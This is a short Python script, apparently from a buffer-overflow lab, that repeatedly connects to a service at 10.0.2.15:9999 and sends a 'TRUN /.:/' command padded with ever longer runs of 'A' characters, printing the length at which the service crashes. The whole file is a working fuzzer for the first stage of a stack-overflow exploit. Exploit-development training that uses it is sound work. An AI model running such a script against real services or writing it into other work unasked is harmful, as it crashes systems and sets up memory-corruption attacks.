import socket
from time import sleep
import sys
numberOfCharacters = 100
stringToSend = "TRUN /.:/" + "A" * numberOfCharacters

while True:
    try:
        my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_socket.connect(("10.0.2.15",9999))
        bytes = stringToSend.encode(encoding="latin1")
        my_socket.send(bytes)
        my_socket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters

        sleep(1)
    except KeyboardInterrupt:
        print("Crashed at " + str(len(stringToSend)))
        sys.exit()
    except Exception as e:
        print("Crashed at "+ str(len(stringToSend)))
        print(e)
        sys.exit()